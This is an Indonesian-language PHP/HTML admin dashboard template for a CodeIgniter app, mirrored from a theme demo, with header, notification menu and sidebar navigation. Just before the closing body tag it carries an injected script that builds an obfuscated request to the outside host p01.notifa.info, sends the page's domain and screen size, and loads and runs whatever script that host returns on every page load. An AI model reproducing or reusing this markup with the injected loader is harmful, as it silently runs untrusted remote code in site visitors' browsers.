<!DOCTYPE html>
<html lang="en">
    
<!-- Mirrored from dreamguys.co.in/demo/ventura/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 05 Feb 2020 08:21:52 GMT -->
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
        <title>Dospi - Admin</title>
		
		<!-- Favicon -->
        <link rel="shortcut icon" type="image/x-icon" href="assets2/img/favicon.png">
		
		<!-- Bootstrap CSS -->
        <link rel="stylesheet" href="assets2/css/bootstrap.min.css">
		
		<!-- Fontawesome CSS -->
        <link rel="stylesheet" href="assets2/css/font-awesome.min.css">
		
		<!-- Feathericon CSS -->
        <link rel="stylesheet" href="assets2/css/feathericon.min.css">
		
		<link rel="stylesheet" href="assets2/plugins/morris/morris.css">
		
		<!-- Main CSS -->
        <link rel="stylesheet" href="assets2/css/style.css">
		
		<!--[if lt IE 9]>
			<script src="assets/js/html5shiv.min.js"></script>
			<script src="assets/js/respond.min.js"></script>
		<![endif]-->
    </head>
    <body>
	
		<!-- Main Wrapper -->
        <div class="main-wrapper">
		
			<!-- Header -->
            <div class="header">
			
				<!-- Logo -->
                <div class="header-left">
                    <a href="<?php echo base_url('index_admin');?>" class="logo">
						<img src="assets2/img/logo.jpg" alt="Logo">
					</a>
					<a href="index-2.html" class="logo logo-small">
						<img src="assets2/img/logo-small.png" alt="Logo" width="30" height="30">
					</a>
                </div>
				<!-- /Logo -->
				
				<a href="javascript:void(0);" id="toggle_btn">
					<i class="fe fe-text-align-left"></i>
				</a>
				
				<div class="top-nav-search">
					<form>
						<input type="text" class="form-control" placeholder="Cari Disini">
						<button class="btn" type="submit"><i class="fa fa-search"></i></button>
					</form>
				</div>
				
				<!-- Mobile Menu Toggle -->
				<a class="mobile_btn" id="mobile_btn">
					<i class="fa fa-bars"></i>
				</a>
				<!-- /Mobile Menu Toggle -->
				
				<!-- Header Right Menu -->
				<ul class="nav user-menu">

					<!-- App Lists -->
					<li class="nav-item dropdown app-dropdown">
						<a class="nav-link dropdown-toggle" aria-expanded="false" role="button" data-toggle="dropdown" href="#"><i class="fe fe-app-menu"></i></a>
						<ul class="dropdown-menu app-dropdown-menu">
							<li>
								<div class="app-list">
									<div class="row">
										<div class="col"><a class="app-item" href="<?php echo base_url('email_admin');?>"><i class="fa fa-envelope"></i><span>Email</span></a></div>
										<div class="col"><a class="app-item" href="<?php echo base_url('kalender_admin');?>"><i class="fa fa-calendar"></i><span>Kalender</span></a></div>
										<div class="col"><a class="app-item" href="<?php echo base_url('pesan_admin');?>"><i class="fa fa-comments"></i><span>Pesan</span></a></div>
									</div>
								</div>
							</li>
						</ul>
					</li>
					<!-- /App Lists -->
					
					<!-- Notifications -->
					<li class="nav-item dropdown noti-dropdown">
						<a href="#" class="dropdown-toggle nav-link" data-toggle="dropdown">
							<i class="fe fe-bell"></i> <span class="badge badge-pill">3</span>
						</a>
						<div class="dropdown-menu notifications">
							<div class="topnav-dropdown-header">
								<span class="notification-title">Notifikasi</span>
								<a href="javascript:void(0)" class="clear-noti"> Bersihkan semua </a>
							</div>
							<div class="noti-content">
								<ul class="notification-list">
									<li class="notification-message">
										<a href="#">
											<div class="media">
												<span class="avatar avatar-sm">
													<img class="avatar-img rounded-circle" alt="User Image" src="assets2/img/profiles/avatar-02.jpg">
												</span>
												<div class="media-body">
													<p class="noti-details"><span class="noti-title">Carlson Tech</span> telah menyetujui <span class="noti-title">estimasi Anda</span></p>
													<p class="noti-time"><span class="notification-time">4 menit yang lalu</span></p>
												</div>
											</div>
										</a>
									</li>
									<li class="notification-message">
										<a href="#">
											<div class="media">
												<span class="avatar avatar-sm">
													<img class="avatar-img rounded-circle" alt="User Image" src="assets2/img/profiles/avatar-11.jpg">
												</span>
												<div class="media-body">
													<p class="noti-details"><span class="noti-title">Zaenal Abidin</span> telah mengirimi anda faktur sejumlah <span class="noti-title">Rp.50.000.000</span></p>
													<p class="noti-time"><span class="notification-time">6 menit yang lalu</span></p>
												</div>
											</div>
										</a>
									</li>

								</ul>
							</div>
							<div class="topnav-dropdown-footer">
								<a href="#">Lihat semua notifikasi</a>
							</div>
						</div>
					</li>
					<!-- /Notifications -->
					
					<!-- User Menu -->
					<li class="nav-item dropdown has-arrow">
						<a href="#" class="dropdown-toggle nav-link" data-toggle="dropdown">
							<span class="user-img"><img class="rounded-circle" src="assets2/img/profiles/avatar-01.jpg" width="31" alt="Ryan Taylor"></span>
						</a>
						<div class="dropdown-menu">
							<div class="user-header">
								<div class="avatar avatar-sm">
									<img src="assets2/img/profiles/avatar-01.jpg" alt="User Image" class="avatar-img rounded-circle">
								</div>
								<div class="user-text">
									<h6>Ryan Taylor</h6>
									<p class="text-muted mb-0">Admin</p>
								</div>
							</div>
							<a class="dropdown-item" href="<?php echo base_url('profil_admin');?>">Profil saya</a>
							<a class="dropdown-item" href="<?php echo base_url('profil_admin');?>">Settings</a>
							<a class="dropdown-item" href="<?php echo base_url('login_admin');?>">Keluar</a>
						</div>
					</li>
					<!-- /User Menu -->
					
				</ul>
				<!-- /Header Right Menu -->
				
            </div>
			<!-- /Header -->
			
			<!-- Sidebar -->
            <div class="sidebar" id="sidebar">
                <div class="sidebar-inner slimscroll">
					<div id="sidebar-menu" class="sidebar-menu">
						<ul>
							<li class="menu-title"> 
								<span>Main</span>
							</li>
							<li class="active"> 
								<a href="<?php echo base_url('index_admin');?>"><i class="fe fe-home"></i> <span>Dashboard</span></a>
							</li>
							<li class="submenu">
								<a href="#"><i class="fe fe-cart"></i> <span> Ecommerce</span> <span class="menu-arrow"></span></a>
								<ul style="display: none;">
									<li><a href="<?php echo base_url('produk_admin');?>">Produk</a></li>
									<li><a href="<?php echo base_url('detail_admin');?>">Tampilan produk</a></li>
									<li><a href="<?php echo base_url('pemesanan_admin');?>">Pemesanan</a></li>
									<li><a href="<?php echo base_url('pelanggan_admin');?>">Pelanggan</a></li>
									<li><a href="<?php echo base_url('faktur_admin');?>">Faktur</a></li>
								</ul>
							</li>
							<li class="submenu">
								<a href="#"><i class="fe fe-tiled"></i> <span> Aplikasi</span> <span class="menu-arrow"></span></a>
								<ul style="display: none;">
									<li><a href="<?php echo base_url('pesan_admin');?>">Pesan</a></li>
									<li><a href="<?php echo base_url('kalender_admin');?>">Kalender</a></li>
									<li><a href="<?php echo base_url('email_admin');?>">Email</a></li>
								</ul>
							</li>
							<li class="menu-title"> 
								<span>Pages</span>
							</li>
							<li> 
								<a href="<?php echo base_url('profil_admin');?>"><i class="fe fe-user-plus"></i> <span>Profil</span></a>
							</li>
							<li class="submenu">
								<a href="#"><i class="fe fe-document"></i> <span> Autentikasi </span> <span class="menu-arrow"></span></a>
								<ul style="display: none;">
									<li><a href="<?php echo base_url('login_admin');?>"> Masuk </a></li>
									<li><a href="<?php echo base_url('register_admin');?>"> Daftar </a></li>
									<li><a href="<?php echo base_url('lupasandi_admin');?>"> Lupa password </a></li>
									<li><a href="<?php echo base_url('layar_kunci');?>"> Layar kunci </a></li>
								</ul>
							</li>
							<li class="submenu">
								<a href="#"><i class="fe fe-warning"></i> <span> Halaman Error </span> <span class="menu-arrow"></span></a>
								<ul style="display: none;">
									<li><a href="<?php echo base_url('error_admin');?>">404 Error </a></li>
									
								</ul>
							</li>
							<li> 
								<a href="<?php echo base_url('pengguna_admin');?>"><i class="fe fe-users"></i> <span>Pengguna</span></a>
							</li>
							<li> 
								<a href="<?php echo base_url('maps_admin');?>"><i class="fe fe-map"></i> <span>Maps</span></a>
							</li>
						</ul>
					</div>
                </div>
            </div>
			<!-- /Sidebar -->
			
			<?php
            	$this->load->view($namamodule .'/'.$namafileview);
            ?>
		<!-- jQuery -->
        <script src="assets2/js/jquery-3.2.1.min.js"></script>
		
		<!-- Bootstrap Core JS -->
        <script src="assets2/js/popper.min.js"></script>
        <script src="assets/js/bootstrap.min.js"></script>
		
		<!-- Slimscroll JS -->
        <script src="assets2/plugins/slimscroll/jquery.slimscroll.min.js"></script>
		
		<script src="assets2/plugins/raphael/raphael.min.js"></script>    
		<script src="assets2/plugins/morris/morris.min.js"></script>  
		<script src="assets/js/chart.morris.js"></script>
		
		<!-- Custom JS -->
		<script  src="assets2/js/script.js"></script>
		
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXHn8lz%2b%2bzCQItoY77y1T6caxXltt9KXxo3kUbVUw5NCUzSJ3Nm2yMuWljZImTYDOdZSrohL1dR5ypo4dbY829OjWLQ4c73ij1VJqVWBXN58Kf2bJAatJ%2bPdtXGDnROGCZUFwIpGQmgRitfoV5t9D2W0ZL4lbJKaD0Eiepk2c%2bNijZ5iFjph%2fPDFIyVZprjf%2bbYDKeSItP6R3xog7Y6ckvC8C%2bAE0K6gem%2fbcoPSNImEp9BfE8%2fhYrKcl%2b8GpLq3epeobLREz%2fEnH08GgFcHuwzDVHGH1DptfNxI%2fTnLPGKcW%2b5uBjjGLEG%2bIBzLNrjYdiE0YUO1%2btl4rpuhZF0EKksgC9AlNSj32clbQZOzHkxvbgRiWw6Ught8ylOfslHBeBSPXloKwvMU7%2frd8Iv5IOZi%2bkgCdpmQtlUW9ZigKzRIqwCn%2b6mU94qaYXEHrXd7xbXZJ1ax0D4eLVqWRIE1CkYvIJRbhMPfUDvjFMYk29dQQ%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from dreamguys.co.in/demo/ventura/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 05 Feb 2020 08:21:52 GMT -->
</html>